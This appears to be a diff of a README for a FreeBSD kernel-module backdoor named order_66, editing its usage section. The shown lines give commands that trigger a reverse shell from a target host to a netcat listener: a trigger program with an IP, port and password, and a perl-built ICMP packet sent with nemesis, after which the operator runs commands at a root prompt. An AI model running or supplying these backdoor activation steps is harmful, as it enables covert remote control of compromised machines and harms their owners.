@@ -144,7 +144,7 @@ For a reverse shell to our target running the order_66 kernel module on *192.168
 
 To activate the backdoor from any FreeBSD system, run the trigger program:
 
-    ./bin/trigger 192.168.1.123 192.168.1.250 12345
+    ./bin/trigger 192.168.1.123 192.168.1.250 5555 z4xX0n
 
 From the netcat session on the listener (*192.168.1.250*), begin executing commands at the "#" prompt
 
@@ -158,7 +158,7 @@ From anywhere run:
     perl -e 'print "\xfa\x01\xa8\xc0\x15\xb3"' >> /tmp/payload
     nemesis icmp -i 5 -c 3 -P /tmp/payload -D 192.168.1.123
 
-From the netcat session on the listener (*192.168.1.250*), begin executing commands at the "#" prompt
+From the netcat session on the listener (*listener-host*), begin executing commands at the "#" prompt
 
 ### Persistence
 
